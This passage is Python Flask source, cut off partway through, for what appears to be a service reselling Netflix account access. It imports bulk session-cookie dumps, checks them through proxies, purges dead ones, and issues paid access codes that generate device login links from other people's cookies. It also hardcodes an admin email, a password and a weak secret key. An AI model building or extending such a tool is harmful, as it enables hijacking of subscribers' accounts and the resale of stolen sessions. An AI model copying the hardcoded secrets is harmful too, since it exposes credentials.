import os
import sys
from flask import Flask, request, render_template_string, redirect, url_for, flash, jsonify, session
import urllib.parse
import requests
from requests.exceptions import ProxyError
import threading
from urllib3.exceptions import InsecureRequestWarning
import database
import parser
import checker
import secrets
import re
from functools import wraps
import random
import string

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
sys.stdout.reconfigure(encoding='utf-8')

app = Flask(__name__)
app.secret_key = "super_secret_key_for_flash_messages_and_sessions_123"

ADMIN_EMAIL = "concumm2@gmail.com"
ADMIN_PASS = "Concumm1!"

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

COMMON_STYLE = r"""
<style>
    :root {
        --bg-color: #0f111a;
        --surface-color: rgba(255, 255, 255, 0.05);
        --primary-color: #E50914;
        --text-color: #f1f1f1;
        --border-color: rgba(255, 255, 255, 0.1);
    }
    body {
        font-family: 'Inter', sans-serif;
        background: linear-gradient(135deg, #0f111a 0%, #1a1c29 100%);
        color: var(--text-color);
        margin: 0; padding: 0; min-height: 100vh;
        display: flex; flex-direction: column; align-items: center;
    }
    .container { position: relative; width: 95%; max-width: 1200px; margin-top: 50px; z-index: 1; }
    .header { text-align: center; margin-bottom: 40px; }
    h1 {
        font-size: 2.5rem; font-weight: 700; margin-bottom: 10px;
        background: linear-gradient(90deg, #fff, #aaa);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    }
    .glass-panel {
        background: rgba(30, 32, 45, 0.95);
        border: 1px solid var(--border-color);
        border-radius: 16px; padding: 30px; margin-bottom: 30px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
    }
    .search-box {
        width: 100%; padding: 12px 15px; border-radius: 8px;
        border: 1px solid var(--border-color); background: rgba(0,0,0,0.3);
        color: white; font-family: 'Inter', sans-serif; font-size: 1rem;
        box-sizing: border-box;
    }
    .search-box:focus {
        outline: none; border-color: var(--primary-color);
        box-shadow: 0 0 10px rgba(229, 9, 20, 0.2);
    }
    button {
        background: var(--primary-color); color: white; border: none;
        padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer;
    }
    button:hover { background: #f40612; }
    .btn-copy { background: #2d98da; padding: 6px 12px; font-size: 0.8rem; border-radius: 4px; border: none; color: white; cursor: pointer; }
    .btn-login {
        background: #27ae60 !important; color: white !important; border: none !important;
        padding: 8px 12px !important; font-size: 0.85rem !important; font-weight: bold !important;
        border-radius: 6px !important; cursor: pointer; text-decoration: none; display: inline-block;
    }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 15px; text-align: left; border-bottom: 1px solid var(--border-color); }
    th { color: #aaa; text-transform: uppercase; font-size: 0.85rem; }
    tr:hover td { background: rgba(255, 255, 255, 0.03); }
    .flash-message {
        background: rgba(46, 213, 115, 0.1); border: 1px solid rgba(46, 213, 115, 0.3);
        color: #2ed573; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center;
    }
    .flash-error {
        background: rgba(255, 71, 87, 0.1); border: 1px solid rgba(255, 71, 87, 0.3); color: #ff4757;
    }
    .flash-warning {
        background: rgba(255, 159, 67, 0.1); border: 1px solid rgba(255, 159, 67, 0.3); color: #ff9f43;
    }
</style>
<script>
    function copyCookie(text, btn) {
        let originalText = btn.innerHTML;
        btn.innerHTML = '✔ Copied';
        btn.style.background = '#20bf6b';
        setTimeout(() => { btn.innerHTML = originalText; btn.style.background = '#2d98da'; }, 2000);
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).catch(err => {
                fallbackCopy(text);
            });
        } else {
            fallbackCopy(text);
        }
    }
    function fallbackCopy(text) {
        let textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try { document.execCommand('copy'); } catch (err) { }
        textArea.remove();
    }
    function showLoading(btn) {
        btn.innerHTML = '⏳ Processing...';
        btn.style.pointerEvents = 'none';
        btn.style.opacity = '0.7';
    }
</script>
"""

PUBLIC_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
    <script>
        function generateQuickLinks() {
            let rawInput = document.getElementById("rawTokenInput").value.trim();
            let resultDiv = document.getElementById("quickLinksResult");
            let pcLink = document.getElementById("quickPcLink");
            let mobileLink = document.getElementById("quickMobileLink");
            let tvLink = document.getElementById("quickTvLink");
            let statusText = document.getElementById("statusText");
            let btn = document.getElementById("submitBtn");
            let checkBtn = document.getElementById("checkBtn");

            if (rawInput) {
                btn.disabled = true;
                checkBtn.disabled = true;
                btn.innerHTML = "⏳ Connecting...";
                pcLink.innerText = "⏳ Generating link...";
                mobileLink.innerText = "⏳ Generating link...";
                tvLink.innerText = "⏳ Generating link...";
                statusText.innerText = "Generating high-speed link...";
                statusText.style.color = "#f39c12";
                resultDiv.style.display = "flex";
                
                // Show links
                document.getElementById("quickPcLink").parentElement.style.display = "flex";
                document.getElementById("quickMobileLink").parentElement.style.display = "flex";
                document.getElementById("quickTvLink").parentElement.style.display = "flex";

                fetch("/api/generate_nftoken", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ cookie: rawInput })
                })
                .then(res => res.json())
                .then(data => {
                    btn.disabled = false;
                    checkBtn.disabled = false;
                    btn.innerHTML = "🚀 LOGIN NOW (Fast Link)";
                    if (data.success) {
                        pcLink.href = data.pc_link;
                        pcLink.innerText = "💻 PC Link (Watch now)";
                        mobileLink.href = data.mobile_link;
                        mobileLink.innerText = "📱 Mobile Link (Watch now)";
                        tvLink.href = data.tv_link;
                        tvLink.innerText = "📺 TV Link (Watch now)";
                        statusText.innerText = "Success! Click a link below to watch.";
                        statusText.style.color = "#2ecc71";
                    } else {
                        statusText.innerText = "Error: " + data.error;
                        statusText.style.color = "#e74c3c";
                        document.getElementById("quickPcLink").parentElement.style.display = "none";
                        document.getElementById("quickMobileLink").parentElement.style.display = "none";
                        document.getElementById("quickTvLink").parentElement.style.display = "none";
                    }
                })
                .catch(err => {
                    btn.disabled = false;
                    checkBtn.disabled = false;
                    btn.innerHTML = "🚀 LOGIN NOW (Fast Link)";
                    statusText.innerText = "Connection to server failed!";
                    statusText.style.color = "#e74c3c";
                });
            } else {
                resultDiv.style.display = "none";
            }
        }
        
        function checkLiveStatus() {
            let rawInput = document.getElementById("rawTokenInput").value.trim();
            let statusText = document.getElementById("statusText");
            let resultDiv = document.getElementById("quickLinksResult");
            let btn = document.getElementById("checkBtn");
            let loginBtn = document.getElementById("submitBtn");
            
            if (!rawInput) {
                alert("Please enter your access code first!");
                return;
            }
            
            btn.disabled = true;
            loginBtn.disabled = true;
            btn.innerHTML = "⏳ Checking via Proxy...";
            statusText.innerText = "Connecting to Netflix to check account status...";
            statusText.style.color = "#f39c12";
            resultDiv.style.display = "flex";
            
            // Ẩn các nút lấy link khi đang check
            document.getElementById("quickPcLink").parentElement.style.display = "none";
            document.getElementById("quickMobileLink").parentElement.style.display = "none";
            document.getElementById("quickTvLink").parentElement.style.display = "none";

            fetch("/api/check_live_code", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cookie: rawInput })
            })
            .then(res => res.json())
            .then(data => {
                btn.disabled = false;
                loginBtn.disabled = false;
                btn.innerHTML = "🔄 CHECK & FIX ACCOUNT IF DEAD";
                if (data.success) {
                    statusText.innerText = data.message;
                    statusText.style.color = "#2ecc71";
                } else {
                    statusText.innerText = "Error: " + data.error;
                    statusText.style.color = "#e74c3c";
                }
            })
            .catch(err => {
                btn.disabled = false;
                loginBtn.disabled = false;
                btn.innerHTML = "🔄 CHECK & FIX ACCOUNT IF DEAD";
                statusText.innerText = "Connection to server failed!";
                statusText.style.color = "#e74c3c";
            });
        }
    </script>
</head>
<body>
    <div class="container" style="max-width: 600px; margin-top: 10vh;">
        <div class="header">
            <h1>Netflix Access</h1>
            <p>Automated Fast Login System</p>
        </div>
        <div class="glass-panel">
            <h3 style="margin-top: 0; text-align: center; font-weight: 400;">Enter Access Code</h3>
            <input type="text" id="rawTokenInput" class="search-box" style="text-align: center; font-size: 1.2rem; letter-spacing: 2px;" placeholder="Example: X9K2M1">
            <button id="submitBtn" onclick="generateQuickLinks()" style="width: 100%; margin-top: 10px; padding: 15px; font-size: 1.1rem; background: #27ae60; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">🚀 LOGIN NOW (Fast Link)</button>
            <button id="checkBtn" onclick="checkLiveStatus()" style="width: 100%; margin-top: 10px; padding: 12px; font-size: 0.9rem; background: #f39c12; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">🔄 CHECK & FIX ACCOUNT IF DEAD</button>
            
            <div id="quickLinksResult" style="display: flex; flex-direction: column; gap: 15px; margin-top: 25px; display: none; background: rgba(0,0,0,0.2); padding: 20px; border-radius: 8px;">
                <p id="statusText" style="text-align: center; margin: 0; font-weight: bold;"></p>
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <a id="quickPcLink" href="#" target="_blank" rel="noreferrer" class="btn-login" style="background: #e74c3c !important; font-size: 1rem; padding: 12px 20px !important;">💻 PC Link</a>
                    <button class="btn-copy" onclick="copyCookie(document.getElementById('quickPcLink').href, this)" style="padding: 12px 20px; font-size: 1rem;">📋 Copy</button>
                </div>
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <a id="quickMobileLink" href="#" target="_blank" rel="noreferrer" class="btn-login" style="background: #e74c3c !important; font-size: 1rem; padding: 12px 20px !important;">📱 Mobile Link</a>
                    <button class="btn-copy" onclick="copyCookie(document.getElementById('quickMobileLink').href, this)" style="padding: 12px 20px; font-size: 1rem;">📋 Copy</button>
                </div>
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <a id="quickTvLink" href="#" target="_blank" rel="noreferrer" class="btn-login" style="background: #e74c3c !important; font-size: 1rem; padding: 12px 20px !important;">📺 TV Link</a>
                    <button class="btn-copy" onclick="copyCookie(document.getElementById('quickTvLink').href, this)" style="padding: 12px 20px; font-size: 1rem;">📋 Copy</button>
                </div>
            </div>
        </div>
        <div style="text-align: center; margin-top: 20px;">
            <a href="/admin" style="color: #666; font-size: 0.8rem; text-decoration: none;">Admin Dashboard</a>
        </div>
    </div>
</body>
</html>
"""

ADMIN_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Admin Dashboard</h1>
            <p>Account & Access Key Management System</p>
            <a href="/" style="color: #3498db; text-decoration: none; margin-right: 15px;">[Back to Home]</a>
            <a href="/logout" style="color: #e74c3c; text-decoration: none;">[Logout]</a>
        </div>

        {% with messages = get_flashed_messages(with_categories=true) %}
          {% if messages %}
            {% for category, message in messages %}
              <div class="flash-message {% if category == 'error' %}flash-error{% elif category == 'warning' %}flash-warning{% endif %}">{{ message }}</div>
            {% endfor %}
          {% endif %}
        {% endwith %}

        <div class="glass-panel">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-weight: 400;">Access Code Management (License Keys)</h3>
                <div style="display: flex; gap: 10px;">
                    <form action="/admin/generate_key" method="POST" style="margin: 0; display: flex; gap: 10px; align-items: center;" onsubmit="showLoading(this.querySelector('button'))">
                        <select name="plan_type" style="padding: 8px; border-radius: 4px; background: rgba(0,0,0,0.5); color: white; border: 1px solid #555;">
                            <option value="premium">Premium (15 Chars)</option>
                            <option value="standard">Standard (10 Chars)</option>
                            <option value="standard_ads">Standard Ads (8 Chars)</option>
                            <option value="basic">Basic (5 Chars)</option>
                        </select>
                        <select name="duration" style="padding: 8px; border-radius: 4px; background: rgba(0,0,0,0.5); color: white; border: 1px solid #555;">
                            <option value="1">1 Month</option>
                            <option value="2">2 Months</option>
                            <option value="3">3 Months</option>
                        </select>
                        <button type="submit" style="background: #27ae60; font-size: 0.9rem; padding: 10px 15px; white-space: nowrap;">+ Generate</button>
                    </form>
                </div>
            </div>
            
            <form action="/admin" method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
                <input type="text" name="search_code" class="search-box" placeholder="Search by 6-char code..." value="{{ request.args.get('search_code', '') }}">
                <button type="submit" style="background: #3498db; white-space: nowrap;">🔍 Search Code</button>
            </form>
            
            <div style="overflow-x: auto;">

                <table>
                    <thead>
                        <tr>
                            <th>Code</th>
                            <th>Assigned Email</th>
                            <th>Created At</th>
                            <th>Expire At</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for key in access_keys %}
                        <tr>
                            <td style="font-weight: bold; font-family: monospace; font-size: 1.3rem; color: #f1c40f; letter-spacing: 2px;">{{ key[0] }}</td>
                            <td>{{ key[1] }}</td>
                            <td style="font-size: 0.85rem; color: #888;">{{ key[2] }}</td>
                            <td style="font-size: 0.85rem; color: #e74c3c; font-weight: bold;">{{ key[3] if key[3] else 'Lifetime' }}</td>
                            <td style="display: flex; gap: 10px; flex-wrap: wrap;">
                                <button class="btn-copy" onclick="copyCookie('{{ key[0] }}', this)">Copy Code</button>
                                <form action="/admin/rotate_key/{{ key[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Do you want to rotate a new account for this code?');">
                                    <button type="submit" style="background: #f39c12; padding: 6px 12px; font-size: 0.8rem;">Change Acc</button>
                                </form>
                                <form action="/admin/delete_key/{{ key[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Delete this code? Customers will no longer be able to use it.');">
                                    <button type="submit" style="background: #e74c3c; padding: 6px 12px; font-size: 0.8rem;">Delete</button>
                                </form>
                            </td>
                        </tr>
                        {% else %}
                        <tr><td colspan="5" style="text-align: center; color: #666; padding: 20px;">No access codes generated yet.</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            
            {% if key_total_pages > 1 %}
            <div style="display: flex; justify-content: center; gap: 5px; margin-top: 15px;">
                {% if key_page > 1 %}
                <a href="?key_page={{ key_page - 1 }}&acc_page={{ acc_page }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">&laquo; Prev</a>
                {% endif %}
                <span style="padding: 5px 10px; color: #888;">Page {{ key_page }} / {{ key_total_pages }}</span>
                {% if key_page < key_total_pages %}
                <a href="?key_page={{ key_page + 1 }}&acc_page={{ acc_page }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">Next &raquo;</a>
                {% endif %}
            </div>
            {% endif %}
        </div>

        <div class="glass-panel">
            <h3 style="margin-top: 0; margin-bottom: 20px; font-weight: 400;">Import Cookies Database</h3>
            <form style="display: flex; gap: 15px; align-items: center;" action="/upload" method="POST" enctype="multipart/form-data" onsubmit="showLoading(this.querySelector('button'))">
                <input type="file" name="account_file" accept=".txt" required style="padding: 10px; background: rgba(0,0,0,0.2); border: 1px dashed var(--border-color); color: #ccc;">
                <button type="submit">Upload Database</button>
            </form>
        </div>

        <div class="glass-panel">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-weight: 400;">Original Cookie Vault <span style="font-size: 0.9rem; color: #888;">({{ total_accounts }} accounts)</span></h3>
                <div style="display: flex; gap: 10px;">
                    <form action="/filter_duplicates" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #f39c12; padding: 8px 15px; font-size: 0.9rem;" title="Filter and delete duplicates with same NetflixId">🧹 FILTER DUPLICATES</button>
                    </form>
                    <form action="/check_payment" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #c0392b; padding: 8px 15px; font-size: 0.9rem;" title="Scan full DB to delete accounts with Update Payment errors">🚫 SCAN PAYMENT ERRORS</button>
                    </form>
                    <form action="/force_check_all" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #e74c3c; padding: 8px 15px; font-size: 0.9rem;" title="Force check all accounts regardless of plan (Costs Proxy)">🔥 FORCE FULL SCAN</button>
                    </form>
                    <form action="/check_all" method="POST" onsubmit="showLoading(this.querySelector('button'))" style="margin: 0;">
                        <button type="submit" style="background: #10ac84; padding: 8px 15px; font-size: 0.9rem;" title="Only scan accounts without a known Plan (Saves Proxy)">⚡ UPDATE MISSING PLANS</button>
                    </form>
                </div>
            </div>
            
            <form action="/admin" method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
                <input type="text" name="search_email" class="search-box" placeholder="Search by Email..." value="{{ request.args.get('search_email', '') }}">
                <button type="submit" style="background: #3498db; white-space: nowrap;">🔍 Search Email</button>
            </form>
            
            <div style="overflow-x: auto; max-height: 500px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Plan</th>
                            <th>Cookie</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for acc in accounts %}
                        <tr>
                            <td style="font-weight: 600;">{{ acc[0] }}</td>
                            <td style="font-weight: bold; color: {% if 'Premium' in (acc[5] or '') %}#f1c40f{% else %}#bdc3c7{% endif %};">{{ acc[5] if acc[5] else 'Unknown' }}</td>
                            <td style="font-size: 0.8rem; color: #666; font-family: monospace; max-width: 200px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="{{ acc[2] }}">{{ acc[2] }}</td>
                            <td style="display: flex; gap: 8px;">
                                <form action="/delete/{{ acc[0] }}" method="POST" style="margin: 0;" onsubmit="return confirm('Delete this cookie?');">
                                    <button type="submit" style="background: #e74c3c; padding: 6px 12px; font-size: 0.8rem;">Delete</button>
                                </form>
                            </td>
                        </tr>
                        {% else %}
                        <tr><td colspan="4" style="text-align: center; color: #666; padding: 20px;">No accounts in database. Please upload a file!</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            
            {% if acc_total_pages > 1 %}
            <div style="display: flex; justify-content: center; gap: 5px; margin-top: 15px;">
                {% if acc_page > 1 %}
                <a href="?key_page={{ key_page }}&acc_page={{ acc_page - 1 }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">&laquo; Prev</a>
                {% endif %}
                <span style="padding: 5px 10px; color: #888;">Page {{ acc_page }} / {{ acc_total_pages }}</span>
                {% if acc_page < acc_total_pages %}
                <a href="?key_page={{ key_page }}&acc_page={{ acc_page + 1 }}&search_code={{ search_code }}&search_email={{ search_email }}" style="padding: 5px 10px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; border-radius: 4px;">Next &raquo;</a>
                {% endif %}
            </div>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

LOGIN_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
</head>
<body>
    <div class="container" style="max-width: 400px; margin-top: 15vh;">
        <div class="glass-panel">
            <h2 style="text-align: center; margin-top: 0;">Admin Login</h2>
            {% with messages = get_flashed_messages(with_categories=true) %}
              {% if messages %}
                {% for category, message in messages %}
                  <div class="flash-message {% if category == 'error' %}flash-error{% endif %}" style="padding: 10px; margin-bottom: 15px;">{{ message }}</div>
                {% endfor %}
              {% endif %}
            {% endwith %}
            <form action="/login" method="POST" style="display: flex; flex-direction: column; gap: 15px;">
                <input type="email" name="email" class="search-box" placeholder="Email" required style="margin-bottom: 0;">
                <input type="password" name="password" class="search-box" placeholder="Password" required style="margin-bottom: 0;">
                <button type="submit" style="width: 100%;">Login</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    database.init_db()
    return render_template_string(PUBLIC_TEMPLATE)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        if email == ADMIN_EMAIL and password == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for("admin"))
        else:
            flash("Incorrect email or password!", "error")
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/logout")
def logout():
    session.pop('logged_in', None)
    return redirect(url_for("login"))

@app.route("/admin")
@login_required
def admin():
    database.init_db()
    all_accounts = database.get_all_accounts()
    all_access_keys = database.get_all_access_keys()
    
    search_email = request.args.get("search_email", "").strip().lower()
    search_code = request.args.get("search_code", "").strip().upper()
    
    # Filter keys
    if search_code:
        access_keys = [k for k in all_access_keys if search_code in k[0].upper()]
    else:
        access_keys = all_access_keys
        
    # Filter accounts
    if search_email:
        accounts = [a for a in all_accounts if search_email in a[0].lower()]
    else:
        accounts = all_accounts
        
    # Pagination
    try:
        key_page = int(request.args.get("key_page", 1))
    except ValueError:
        key_page = 1
        
    try:
        acc_page = int(request.args.get("acc_page", 1))
    except ValueError:
        acc_page = 1
        
    PER_PAGE = 50
    
    total_keys_filtered = len(access_keys)
    key_start = (key_page - 1) * PER_PAGE
    key_end = key_start + PER_PAGE
    access_keys = access_keys[key_start:key_end]
    key_total_pages = max(1, (total_keys_filtered + PER_PAGE - 1) // PER_PAGE)
    
    total_acc_filtered = len(accounts)
    acc_start = (acc_page - 1) * PER_PAGE
    acc_end = acc_start + PER_PAGE
    accounts = accounts[acc_start:acc_end]
    acc_total_pages = max(1, (total_acc_filtered + PER_PAGE - 1) // PER_PAGE)
        
    return render_template_string(
        ADMIN_TEMPLATE, 
        accounts=accounts, 
        access_keys=access_keys,
        total_accounts=len(all_accounts),
        search_email=search_email,
        search_code=search_code,
        key_page=key_page,
        key_total_pages=key_total_pages,
        acc_page=acc_page,
        acc_total_pages=acc_total_pages
    )

from datetime import datetime, timedelta

@app.route("/admin/generate_key", methods=["POST"])
@login_required
def generate_key():
    database.init_db()
    
    plan_type = request.form.get("plan_type", "basic")
    duration = int(request.form.get("duration", "1"))
    
    if plan_type == 'premium':
        length = 15
    elif plan_type == 'standard':
        length = 10
    elif plan_type == 'standard_ads':
        length = 8
    else:
        length = 5
        plan_type = 'basic'

    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    expire_at = (datetime.now() + timedelta(days=30 * duration)).strftime("%Y-%m-%d")
    
    success, msg = database.create_access_key(code, expire_at)
    if success:
        flash(f"Successfully generated {plan_type.upper()} code ({duration} months): {code}", "success")
    else:
        flash(f"Error generating code: {msg}", "error")
    return redirect(url_for("admin"))

@app.route("/admin/rotate_key/<code>", methods=["POST"])
@login_required
def rotate_key(code):
    success = database.rotate_access_key(code)
    if success:
        flash(f"Changed to a new account for code: {code}", "success")
    else:
        flash(f"Error: No available accounts left in the vault to replace.", "error")
    return redirect(url_for("admin"))

@app.route("/admin/delete_key/<code>", methods=["POST"])
@login_required
def delete_key(code):
    database.delete_access_key(code)
    flash(f"Deleted access code: {code}", "success")
    return redirect(url_for("admin"))

@app.route("/upload", methods=["POST"])
@login_required
def upload():
    if "account_file" not in request.files:
        flash("Error: No upload file found.", "error")
        return redirect(url_for("admin"))
        
    file = request.files["account_file"]
    if file.filename == "":
        flash("Error: No file selected.", "error")
        return redirect(url_for("admin"))
        
    if file:
        file_bytes = file.read()
        try:
            content = file_bytes.decode('utf-8-sig')
        except UnicodeDecodeError:
            try:
                content = file_bytes.decode('utf-16')
            except UnicodeDecodeError:
                content = file_bytes.decode('latin-1', errors='replace')
                
        lines = content.splitlines()
        accounts_list = parser.parse_lines(lines)
            
        if accounts_list:
            database.init_db()
            count = 0
            for acc in accounts_list:
                database.save_account(acc['email'], acc['expire'], acc['netflix_id'], acc['secure_netflix_id'], acc.get('plan'))
                count += 1
            flash(f"🎉 Successfully extracted and saved {count} accounts into the Database!", "success")
        else:
            debug_info = content[:200] if content else "EMPTY_FILE"
            flash(f"❌ Failed: No valid accounts found in the file. Debug info: {debug_info}", "error")
            
    return redirect(url_for("admin"))

@app.route("/delete/<email>", methods=["POST"])
@login_required
def delete_acc(email):
    database.delete_account(email)
    flash(f"Deleted cookie: {email}", "success")
    return redirect(url_for("admin"))

from concurrent.futures import ThreadPoolExecutor

def check_single_account(acc, force=False, check_payment=False):
    email = acc[0]
    current_plan = acc[5]
    
    # Bỏ qua những tài khoản đã có gói cước nếu không force
    if not force and current_plan:
        return
        
    netflix_id = acc[2]
    secure_netflix_id = acc[3]
    status, plan = checker.check_account_live(netflix_id, secure_netflix_id, check_payment)
    
    if status == "LIVE" and plan:
        if not check_payment:
            database.update_plan(email, plan)
    elif status == "DIE":
        database.delete_account(email)

def background_check_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, False)

@app.route("/check_all", methods=["POST"])
@login_required
def check_all():
    database.init_db()
    accounts = database.get_all_accounts()
    
    # Lọc ra các tài khoản chưa có gói cước
    accounts_to_check = [acc for acc in accounts if not acc[5]]
    
    if not accounts_to_check:
        flash("All accounts in the vault already have a Plan. No update needed.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_check_all)
    t.daemon = True
    t.start()
    
    estimated_time = (len(accounts_to_check) // 10) + 2
    flash(f"🔄 Background updating {len(accounts_to_check)} accounts with X10 speed (approx {estimated_time}s). Dead cookies will be auto-deleted.", "warning")
    return redirect(url_for("admin"))

def background_force_check_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, True, False)

def background_check_payment_all():
    with app.app_context():
        database.init_db()
        accounts = database.get_all_accounts()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            for acc in accounts:
                executor.submit(check_single_account, acc, True, True)

@app.route("/check_payment", methods=["POST"])
@login_required
def check_payment_route():
    database.init_db()
    accounts = database.get_all_accounts()
    
    if not accounts:
        flash("No accounts in vault to scan.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_check_payment_all)
    t.daemon = True
    t.start()
    
    estimated_time = (len(accounts) // 10) + 2
    flash(f"🚫 Background scanning PAYMENT ERRORS for {len(accounts)} accounts (approx {estimated_time}s). Faulty accounts will be auto-deleted.", "warning")
    return redirect(url_for("admin"))

@app.route("/filter_duplicates", methods=["POST"])
@login_required
def filter_duplicates():
    database.init_db()
    accounts = database.get_all_accounts()
    
    seen_netflix_ids = {} # map netflix_id -> {'email': email, 'plan': plan}
    duplicates_to_delete = []
    
    for acc in accounts:
        email = acc[0]
        netflix_id = acc[2]
        plan = acc[5]
        
        if not netflix_id:
            continue
            
        if netflix_id in seen_netflix_ids:
            # Nếu acc hiện tại CÓ plan mà acc trước đó KHÔNG có, ta xóa acc trước đó và giữ acc hiện tại
            existing_email = seen_netflix_ids[netflix_id]['email']
            existing_plan = seen_netflix_ids[netflix_id]['plan']
            
            if plan and not existing_plan:
                duplicates_to_delete.append(existing_email)
                seen_netflix_ids[netflix_id] = {'email': email, 'plan': plan}
            else:
                duplicates_to_delete.append(email)
        else:
            seen_netflix_ids[netflix_id] = {'email': email, 'plan': plan}
            
    for email in duplicates_to_delete:
        database.delete_account(email)
        
    if duplicates_to_delete:
        flash(f"🧹 Filtered and deleted {len(duplicates_to_delete)} duplicate accounts (same NetflixId).", "success")
    else:
        flash("Your vault is clean, no duplicated NetflixId cookies found!", "success")
        
    return redirect(url_for("admin"))

@app.route("/force_check_all", methods=["POST"])
@login_required
def force_check_all():
    database.init_db()
    accounts = database.get_all_accounts()
    
    if not accounts:
        flash("No accounts in vault to scan.", "warning")
        return redirect(url_for("admin"))
        
    import threading
    t = threading.Thread(target=background_force_check_all)
    t.daemon = True
    t.start()
    
    estimated_time = len(accounts) * 2
    flash(f"🔥 FORCING full background scan for ALL {len(accounts)} accounts in vault (approx {estimated_time}s). This will consume significant Proxy bandwidth.", "warning")
    return redirect(url_for("admin"))



# Constants for Netflix API
NETFLIX_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NETFLIX_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
